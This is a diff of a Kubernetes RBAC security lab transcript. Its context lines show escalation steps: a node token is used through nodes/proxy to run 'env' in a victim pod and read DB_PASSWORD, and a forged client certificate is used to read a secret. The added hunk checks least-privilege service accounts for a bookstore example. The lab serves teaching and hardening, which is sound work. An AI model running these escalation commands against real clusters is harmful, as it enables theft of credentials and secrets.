@@ -61,7 +61,7 @@ clusterrolebinding.rbac.authorization.k8s.io/p05-csr-approver created
 $ kubectl apply -f victim.yaml
 kubectl wait -n p05-rbac --for=condition=Ready pod/p05-victim --timeout=120s
 pod/p05-victim created
-error: timed out waiting for the condition on pods/p05-victim
+pod/p05-victim condition met
 
 $ kubectl --kubeconfig dev.kubeconfig auth whoami | grep Username
 Username                                            system:serviceaccount:p05-rbac:p05-dev
@@ -247,7 +247,7 @@ Warning: resource 'nodes' is not namespace scoped
 
 yes
 no
-      36
+      29
 
 $ curl -s --cacert ca.crt -H "Authorization: Bearer $TOK_NODE" -X POST "$SERVER/api/v1/nodes/$NODE/proxy/run/p05-rbac/p05-victim/app?cmd=env" | grep DB_PASSWORD
 DB_PASSWORD=p05-lab-only-password
@@ -296,7 +296,7 @@ $ openssl x509 -in impostor.crt -noout -subject -enddate
 kubectl --kubeconfig impostor.kubeconfig auth whoami | grep -E 'Username|Groups'
 kubectl --kubeconfig impostor.kubeconfig get secret p05-db-creds -n p05-rbac -o jsonpath='{.data.password}' | base64 -d; echo
 subject=O=p05-readers, CN=p05-impostor
-notAfter=Oct 30 23:07:06 2026 GMT
+notAfter=Oct 31 07:02:17 2026 GMT
 Username                                            p05-impostor
 Groups                                              [p05-readers system:authenticated]
 p05-lab-only-password
@@ -314,6 +314,68 @@ $ kubectl --kubeconfig approver.kubeconfig apply -f impostor2-csr.yaml
 kubectl --kubeconfig approver.kubeconfig certificate approve p05-impostor2-csr
 certificatesigningrequest.certificates.k8s.io/p05-impostor2-csr created
 Error from server (Forbidden): certificatesigningrequests.certificates.k8s.io "p05-impostor2-csr" is forbidden: user not permitted to approve requests with signerName "kubernetes.io/kube-apiserver-client"
+
+## bookstore: one identity per workload, and what the catalog identity may do
+$ kubectl create ns p05-01-bookstore
+kubectl label ns p05-01-bookstore pod-security.kubernetes.io/enforce=restricted pod-security.kubernetes.io/enforce-version=latest
+namespace/p05-01-bookstore created
+namespace/p05-01-bookstore labeled
+
+$ sed 's/namespace: bookstore/namespace: p05-01-bookstore/' examples/bookstore/raw-manifests/05-serviceaccounts-rbac.yaml | kubectl apply -f -
+serviceaccount/catalog-sa created
+serviceaccount/storefront-sa created
+serviceaccount/orders-sa created
+serviceaccount/payments-worker-sa created
+serviceaccount/postgres-sa created
+serviceaccount/redis-sa created
+serviceaccount/rabbitmq-sa created
+serviceaccount/migrate-sa created
+role.rbac.authorization.k8s.io/catalog-config-reader created
+rolebinding.rbac.authorization.k8s.io/catalog-config-reader-binding created
+
+$ kubectl auth can-i get configmap/catalog-config -n p05-01-bookstore --as=system:serviceaccount:p05-01-bookstore:catalog-sa
+kubectl auth can-i list configmaps -n p05-01-bookstore --as=system:serviceaccount:p05-01-bookstore:catalog-sa
+kubectl auth can-i get secret/db-credentials -n p05-01-bookstore --as=system:serviceaccount:p05-01-bookstore:catalog-sa
+kubectl auth can-i --list -n p05-01-bookstore --as=system:serviceaccount:p05-01-bookstore:orders-sa
+yes
+no
+no
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+                                                [/api]                                 []               [get]
+                                                [/apis/*]                              []               [get]
+                                                [/apis]                                []               [get]
+                                                [/healthz]                             []               [get]
+                                                [/healthz]                             []               [get]
+                                                [/livez]                               []               [get]
+                                                [/livez]                               []               [get]
+                                                [/openapi/*]                           []               [get]
+                                                [/openapi]                             []               [get]
+                                                [/openid/v1/jwks/]                     []               [get]
+                                                [/openid/v1/jwks]                      []               [get]
+                                                [/readyz]                              []               [get]
+                                                [/readyz]                              []               [get]
+                                                [/version/]                            []               [get]
+                                                [/version/]                            []               [get]
+                                                [/version]                             []               [get]
+                                                [/version]                             []               [get]
+
+## bookstore: the catalog identity in a Pod, with no token mounted
+$ kubectl run sa-peek -n p05-01-bookstore --image=busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662 --restart=Never -i --rm </dev/null --overrides='{"spec":{"serviceAccountName":"catalog-sa","automountServiceAccountToken":false,"securityContext":{"runAsNonRoot":true,"runAsUser":65532,"runAsGroup":65532,"seccompProfile":{"type":"RuntimeDefault"}},"volumes":[{"name":"tmp","emptyDir":{}}],"containers":[{"name":"sa-peek","image":"busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662","securityContext":{"allowPrivilegeEscalation":false,"readOnlyRootFilesystem":true,"capabilities":{"drop":["ALL"]}},"resources":{"requests":{"cpu":"10m","memory":"16Mi"},"limits":{"memory":"32Mi"}},"volumeMounts":[{"name":"tmp","mountPath":"/tmp"}],"command":["sh","-c","ls /var/run/secrets/kubernetes.io/serviceaccount 2>&1 || echo NO-TOKEN-MOUNTED"]}]}}'
+ls: /var/run/secrets/kubernetes.io/serviceaccount: No such file or directory
+NO-TOKEN-MOUNTED
+All commands and output from this session will be recorded in container logs, including credentials and sensitive information passed through the command prompt.
+If you don't see a command prompt, try pressing enter.
+pod "sa-peek" deleted from p05-01-bookstore namespace
+
+$ kubectl delete ns p05-01-bookstore --wait=true
+namespace "p05-01-bookstore" deleted
 
 ## step 11: tear down what the lab created
 $ kubectl delete ns p05-rbac --wait=true
